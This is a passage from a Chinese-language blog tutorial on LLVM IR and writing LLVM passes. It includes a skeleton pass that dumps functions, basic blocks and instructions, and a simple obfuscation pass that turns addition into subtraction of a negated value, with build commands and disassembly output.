&quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.ident &#x3D; !&#123;!0&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;!&quot;clang version 4.0.0 (trunk 291212)&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>感觉配合着官网的文档，很容易就可以读懂，语法也很清晰明了。<br>比如test函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define i32 @_Z4testii(i32, i32) #0 &#123; &#x2F;&#x2F;@是全局标识符，%是局部标识符</span><br><span class="line">  %3 &#x3D; alloca i32, align 4    &#x2F;&#x2F;局部变量声明，并分配空间，4字节对齐</span><br><span class="line">  %4 &#x3D; alloca i32, align 4    </span><br><span class="line">  store i32 %0, i32* %3, align 4 &#x2F;&#x2F;刚才的变量存储在 0号寄存器的位置</span><br><span class="line">  store i32 %1, i32* %4, align 4 &#x2F;&#x2F;..............1号寄存器的位置</span><br><span class="line">  %5 &#x3D; load i32, i32* %3, align 4 </span><br><span class="line">  %6 &#x3D; load i32, i32* %4, align 4 &#x2F;&#x2F;分别载入到5号寄存器和6号寄存器的位置</span><br><span class="line">  %7 &#x3D; add nsw i32 %5, %6    &#x2F;&#x2F;然后相加，存到7号寄存器的位置</span><br><span class="line">  ret i32 %7    &#x2F;&#x2F;返回结果（32位整数）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>弱弱的说一句…感觉好像JAVA字节码啊</p>
<p>更多的内容，还是<a href="http://llvm.org/docs/LangRef.html">官方文档</a></p>
<h4 id="0x2-Pass"><a href="#0x2-Pass" class="headerlink" title="0x2. Pass"></a>0x2. Pass</h4><p>Pass 的主要分类有以下几种。</p>
<ul>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">ImmutablePass</a><br>  Immutable,字面意思一成不变，即这种pass不是普通的用来转换、分析的pass，他可以提供当前编译器配置的信息。这种pass不需要运行、也不改变状态、也不需要更新。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-moudlepass-class">MoudlePass</a><br>  从ModulePass派生表示这个pass使用整个程序作为一个单元，不可预测的顺序引用函数体，或者添加、删除函数；这种pass对子类行为并不了解，所以无法对其做优化。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-callgraphsccpass-class">CallGraphSCCPass</a><br>  这种需要遍历自下而上的函数调用图。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-funcationpass-class">FuncationPass</a><br>  在每个函数上执行。这个pass再llvm的文档上有例子，那个hello world的例子。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-looppass-class">LoopPass</a><br>  这种再每个循环上执行，与函数中其他的循环无关；LoopPass使用嵌套顺序处理循环，外层最后处理。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-regionpass-class">RegionPass</a><br>  类似LoopPass，但是在函数执行中的每个单个条目的退出区域上执行。还是嵌套顺序处理区域，即最外部的区域最后被处理。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-basicblockpass-class">BasicBlockPass</a><br>  类似FunctionPass，但是必须一次限制它们对基本块的检查和修改范围，具体的限制见文档。</p>
</li>
<li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-machinefunctionPass-class">MachineFunctionPass</a><br>  LLVM代码生成器的一部分，在程序中的每个LLVM函数的依赖于机器的表示上执行。</p>
</li>
</ul>
<p>根据<a href="http://www.cs.cornell.edu/~asampson/blog/llvm.html">LLVM for Grad Students</a>文章的方式去动态<br>使用pass。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">SkeletonPass</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    SkeletonPass() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;In a function called &quot;</span> &lt;&lt; F.getName() &lt;&lt; <span class="string">&quot;!\n&quot;</span>; <span class="comment">//如果是函数，输出函数名字</span></span><br><span class="line"></span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Function body:\n&quot;</span>;</span><br><span class="line">      F.dump();                     <span class="comment">//打印函数体</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;B : F) &#123;</span><br><span class="line">        errs() &lt;&lt; <span class="string">&quot;Basic block:\n&quot;</span>; <span class="comment">//是bb块就输出这行</span></span><br><span class="line">        B.dump();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;I : B) &#123;</span><br><span class="line">          errs() &lt;&lt; <span class="string">&quot;Instruction: &quot;</span>; <span class="comment">//指令的话就输出这行</span></span><br><span class="line">          I.dump();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> SkeletonPass::ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// Automatically enable the pass.</span></span><br><span class="line"><span class="comment">// http://adriansampson.net/blog/clangpass.html </span></span><br><span class="line"><span class="comment">// 注册Pass</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerSkeletonPass</span><span class="params">(<span class="keyword">const</span> PassManagerBuilder &amp;,</span></span></span><br><span class="line"><span class="function"><span class="params">                         legacy::PassManagerBase &amp;PM)</span> </span>&#123;</span><br><span class="line">  PM.add(<span class="keyword">new</span> SkeletonPass());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> RegisterStandardPasses</span><br><span class="line">  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,</span><br><span class="line">                 registerSkeletonPass);</span><br></pre></td></tr></table></figure>
<p>CmakeList.txt文件</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">add_library(SkeletonPass MODULE</span><br><span class="line">    <span class="comment"># List your source files here.</span></span><br><span class="line">    Skeleton.cpp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use C++11 to compile our pass (i.e., supply -std=c++11).</span></span><br><span class="line">target_compile_features(SkeletonPass PRIVATE cxx_range_for cxx_auto_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># LLVM is (typically) built with no C++ RTTI. We need to match that;</span></span><br><span class="line"><span class="comment"># otherwise, we&#x27;ll get linker errors about missing RTTI data.</span></span><br><span class="line">set_target_properties(SkeletonPass PROPERTIES</span><br><span class="line">    COMPILE_FLAGS <span class="string">&quot;-fno-rtti&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get proper shared-library behavior (where symbols are not necessarily</span></span><br><span class="line"><span class="comment"># resolved when the shared library is linked) on OS X.</span></span><br><span class="line">if(APPLE)</span><br><span class="line">    set_target_properties(SkeletonPass PROPERTIES</span><br><span class="line">        LINK_FLAGS <span class="string">&quot;-undefined dynamic_lookup&quot;</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">endif</span>(APPLE)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译pass</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>然后就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ muhe-work in ~&#x2F;Code&#x2F;llvm-pass-skeleton&#x2F;build on git:master x [17:10:02] </span><br><span class="line">$ make</span><br><span class="line">Scanning dependencies of target SkeletonPass</span><br><span class="line">[ 50%] Building CXX object skeleton&#x2F;CMakeFiles&#x2F;SkeletonPass.dir&#x2F;Skeleton.cpp.o</span><br><span class="line">[100%] Linking CXX shared module libSkeletonPass.so</span><br><span class="line">[100%] Built target SkeletonPass</span><br></pre></td></tr></table></figure>

<p>现在编写一个程序来测试这个Pass，我们的Pass可以标识出代码块和指令。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am a func\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test time : %d\n&quot;</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>现在运行这个Pass<br><code>clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.so -c test.c</code></p>
<p>得到的结果略长，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ muhe-work in ~&#x2F;Code&#x2F;llvm-pass-skeleton on git:master x [17:20:12] </span><br><span class="line">$ clang -Xclang -load -Xclang build&#x2F;skeleton&#x2F;libSkeletonPass.so -c test.c    </span><br><span class="line">In a function called func!</span><br><span class="line">Function body:</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define void @func() #0 &#123;</span><br><span class="line">  %1 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">  %1 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line"></span><br><span class="line">Instruction:   %1 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">Instruction:   ret void</span><br><span class="line">In a function called main!</span><br><span class="line">Function body:</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define i32 @main(i32, i8**) #0 &#123;</span><br><span class="line">  %3 &#x3D; alloca i32, align 4</span><br><span class="line">  %4 &#x3D; alloca i32, align 4</span><br><span class="line">  %5 &#x3D; alloca i8**, align 8</span><br><span class="line">  %6 &#x3D; alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %3, align 4</span><br><span class="line">  store i32 %0, i32* %4, align 4</span><br><span class="line">  store i8** %1, i8*** %5, align 8</span><br><span class="line">  store i32 0, i32* %6, align 4</span><br><span class="line">  br label %7</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:7:                                      ; preds &#x3D; %13, %2</span><br><span class="line">  %8 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %9 &#x3D; icmp slt i32 %8, 10</span><br><span class="line">  br i1 %9, label %10, label %16</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:10:                                     ; preds &#x3D; %7</span><br><span class="line">  %11 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %12 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11)</span><br><span class="line">  br label %13</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:13:                                     ; preds &#x3D; %10</span><br><span class="line">  %14 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %15 &#x3D; add nsw i32 %14, 1</span><br><span class="line">  store i32 %15, i32* %6, align 4</span><br><span class="line">  br label %7</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:16:                                     ; preds &#x3D; %7</span><br><span class="line">  call void @func()</span><br><span class="line">  %17 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">  %3 &#x3D; alloca i32, align 4</span><br><span class="line">  %4 &#x3D; alloca i32, align 4</span><br><span class="line">  %5 &#x3D; alloca i8**, align 8</span><br><span class="line">  %6 &#x3D; alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %3, align 4</span><br><span class="line">  store i32 %0, i32* %4, align 4</span><br><span class="line">  store i8** %1, i8*** %5, align 8</span><br><span class="line">  store i32 0, i32* %6, align 4</span><br><span class="line">  br label %7</span><br><span class="line"></span><br><span class="line">Instruction:   %3 &#x3D; alloca i32, align 4</span><br><span class="line">Instruction:   %4 &#x3D; alloca i32, align 4</span><br><span class="line">Instruction:   %5 &#x3D; alloca i8**, align 8</span><br><span class="line">Instruction:   %6 &#x3D; alloca i32, align 4</span><br><span class="line">Instruction:   store i32 0, i32* %3, align 4</span><br><span class="line">Instruction:   store i32 %0, i32* %4, align 4</span><br><span class="line">Instruction:   store i8** %1, i8*** %5, align 8</span><br><span class="line">Instruction:   store i32 0, i32* %6, align 4</span><br><span class="line">Instruction:   br label %7</span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:7:                                      ; preds &#x3D; %13, %2</span><br><span class="line">  %8 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %9 &#x3D; icmp slt i32 %8, 10</span><br><span class="line">  br i1 %9, label %10, label %16</span><br><span class="line"></span><br><span class="line">Instruction:   %8 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">Instruction:   %9 &#x3D; icmp slt i32 %8, 10</span><br><span class="line">Instruction:   br i1 %9, label %10, label %16</span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:10:                                     ; preds &#x3D; %7</span><br><span class="line">  %11 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %12 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11)</span><br><span class="line">  br label %13</span><br><span class="line"></span><br><span class="line">Instruction:   %11 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">Instruction:   %12 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11)</span><br><span class="line">Instruction:   br label %13</span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:13:                                     ; preds &#x3D; %10</span><br><span class="line">  %14 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">  %15 &#x3D; add nsw i32 %14, 1</span><br><span class="line">  store i32 %15, i32* %6, align 4</span><br><span class="line">  br label %7</span><br><span class="line"></span><br><span class="line">Instruction:   %14 &#x3D; load i32, i32* %6, align 4</span><br><span class="line">Instruction:   %15 &#x3D; add nsw i32 %14, 1</span><br><span class="line">Instruction:   store i32 %15, i32* %6, align 4</span><br><span class="line">Instruction:   br label %7</span><br><span class="line">Basic block:</span><br><span class="line"></span><br><span class="line">; &lt;label&gt;:16:                                     ; preds &#x3D; %7</span><br><span class="line">  call void @func()</span><br><span class="line">  %17 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret i32 0</span><br><span class="line"></span><br><span class="line">Instruction:   call void @func()</span><br><span class="line">Instruction:   %17 &#x3D; call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">Instruction:   ret i32 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>一些包含关系：<br><code>[Module [Function [BasicBlock [Instruction]]]]</code></li>
</ul>
<p>他这篇文章后面例子还有使用Pass替换一些指令，如把add换成了mul，感兴趣可以跟着他的文章写一下。</p>
<h4 id="0x3-使用LLVM来做混淆"><a href="#0x3-使用LLVM来做混淆" class="headerlink" title="0x3. 使用LLVM来做混淆"></a>0x3. 使用LLVM来做混淆</h4><p>add替换成sub指令，即<code>add a,b</code>换成了<code>sub a,-b</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Intrinsics.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SimplePass</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> ID; <span class="comment">// Pass identification, replacement for typeid</span></span><br><span class="line">         </span><br><span class="line">        SimplePass() : FunctionPass(ID) &#123;&#125;</span><br><span class="line">	 </span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">            Function *tmp = &amp;F;</span><br><span class="line">            <span class="comment">// 遍历函数中的所有基本块</span></span><br><span class="line">            <span class="keyword">for</span> (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123;</span><br><span class="line">                <span class="comment">// 遍历基本块中的每条指令</span></span><br><span class="line">                <span class="keyword">for</span> (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123;</span><br><span class="line">                    <span class="comment">// 是否是add指令</span></span><br><span class="line">                    <span class="keyword">if</span> (inst-&gt;isBinaryOp()) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (inst-&gt;getOpcode() == Instruction::Add) &#123;</span><br><span class="line">                            <span class="keyword">return</span> ob_add(cast&lt;BinaryOperator&gt;(inst));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">// a+b === a-(-b)</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">ob_add</span><span class="params">(BinaryOperator *bo)</span> </span>&#123;</span><br><span class="line">            BinaryOperator *op = <span class="literal">NULL</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">if</span> (bo-&gt;getOpcode() == Instruction::Add) &#123;</span><br><span class="line">                <span class="comment">// 生成 (－b)</span></span><br><span class="line">                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, bo);</span><br><span class="line">                <span class="comment">// 生成 a-(-b)</span></span><br><span class="line">                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(<span class="number">0</span>), op, <span class="string">&quot;&quot;</span>, bo);</span><br><span class="line">                 </span><br><span class="line">                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());</span><br><span class="line">                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());</span><br><span class="line">                <span class="comment">// 替换所有出现该指令的地方</span></span><br><span class="line">                bo-&gt;replaceAllUsesWith(op);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> SimplePass::ID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Automatically enable the pass.</span></span><br><span class="line"><span class="comment">// http://adriansampson.net/blog/clangpass.html</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerSimplePass</span><span class="params">(<span class="keyword">const</span> PassManagerBuilder &amp;,</span></span></span><br><span class="line"><span class="function"><span class="params">                         legacy::PassManagerBase &amp;PM)</span> </span>&#123;</span><br><span class="line">  PM.add(<span class="keyword">new</span> SimplePass());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> RegisterStandardPasses</span><br><span class="line">  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,</span><br><span class="line">                 registerSimplePass);</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">add_library(SimplePass MODULE</span><br><span class="line">    <span class="comment"># List your source files here.</span></span><br><span class="line">    SimplePass.cpp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use C++11 to compile our pass (i.e., supply -std=c++11).</span></span><br><span class="line">target_compile_features(SimplePass PRIVATE cxx_range_for cxx_auto_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># LLVM is (typically) built with no C++ RTTI. We need to match that.</span></span><br><span class="line">set_target_properties(SimplePass PROPERTIES</span><br><span class="line">    COMPILE_FLAGS <span class="string">&quot;-fno-rtti&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get proper shared-library behavior (where symbols are not necessarily</span></span><br><span class="line"><span class="comment"># resolved when the shared library is linked) on OS X.</span></span><br><span class="line">if(APPLE)</span><br><span class="line">    set_target_properties(SimplePass PROPERTIES</span><br><span class="line">        LINK_FLAGS <span class="string">&quot;-undefined dynamic_lookup&quot;</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">endif</span>(APPLE)</span><br></pre></td></tr></table></figure>

<p>我的测试代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ cat example.c </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, num + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先编译正常的程序<br><code>clang example.c -o before</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ file before </span><br><span class="line">before: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure>
<p>看一下main的逻辑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -M intel -d  before </span><br><span class="line"></span><br><span class="line">. . . </span><br><span class="line"></span><br><span class="line">0000000000400580 &lt;main&gt;:</span><br><span class="line">  400580:	55                   	push   rbp</span><br><span class="line">  400581:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  400584:	48 83 ec 20          	sub    rsp,0x20</span><br><span class="line">  400588:	48 b8 64 06 40 00 00 	movabs rax,0x400664</span><br><span class="line">  40058f:	00 00 00 </span><br><span class="line">  400592:	48 8d 4d ec          	lea    rcx,[rbp-0x14]</span><br><span class="line">  400596:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">  40059d:	89 7d f8             	mov    DWORD PTR [rbp-0x8],edi</span><br><span class="line">  4005a0:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">  4005a4:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  4005a7:	48 89 ce             	mov    rsi,rcx</span><br><span class="line">  4005aa:	b0 00                	mov    al,0x0</span><br><span class="line">  4005ac:	e8 af fe ff ff       	call   400460 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">  4005b1:	48 bf 67 06 40 00 00 	movabs rdi,0x400667</span><br><span class="line">  4005b8:	00 00 00 </span><br><span class="line">  4005bb:	8b 55 ec             	mov    edx,DWORD PTR [rbp-0x14]</span><br><span class="line">  4005be:	83 c2 02             	add    edx,0x2  &#x2F;&#x2F;num + 2 语句</span><br><span class="line">  4005c1:	89 d6                	mov    esi,edx</span><br><span class="line">  4005c3:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax</span><br><span class="line">  4005c6:	b0 00                	mov    al,0x0</span><br><span class="line">  4005c8:	e8 73 fe ff ff       	call   400440 &lt;printf@plt&gt;</span><br><span class="line">  4005cd:	31 d2                	xor    edx,edx</span><br><span class="line">  4005cf:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax</span><br><span class="line">  4005d2:	89 d0                	mov    eax,edx</span><br><span class="line">  4005d4:	48 83 c4 20          	add    rsp,0x20</span><br><span class="line">  4005d8:	5d                   	pop    rbp</span><br><span class="line">  4005d9:	c3                   	ret    </span><br><span class="line">  4005da:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"></span><br><span class="line">. . .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在编译一个混淆过的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir build_1</span><br><span class="line">cd build_1</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>然后<br><code>clang -Xclang -load -Xclang build_1/simple/libSimplePass.so -c example.c</code><br>得到<code>example.o</code>文件，这个还没链接，我们使用clang再链接一下就好了。</p>
